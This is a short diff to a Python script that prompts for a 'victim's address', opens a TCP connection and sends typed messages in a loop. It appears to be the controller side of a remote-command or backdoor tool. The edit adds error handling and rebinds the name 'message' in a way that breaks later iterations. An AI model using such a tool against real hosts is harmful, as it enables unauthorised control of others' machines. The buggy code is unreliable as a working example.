@@ -6,11 +6,16 @@ if __name__ == "__main__":
     HOST = input("victim's address: ")
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((HOST, PORT))
+    print("igen igen")
     while True:
-        msg = message.Message(input("> ").strip())
-        if msg == "exit":
-            break
-        if msg == "":
-            continue
-        client.send(msg.Encode().encode("utf-8"))
+        try:
+            message = message.Message(input("> ").strip())
+            if message.message == "exit":
+                print("igen igen")
+                break
+            if message.message == "":
+                continue
+            client.send(message.Encode().encode("utf-8"))
+        except Exception as e:
+            print(f"Error: {e}")
     print("Done")
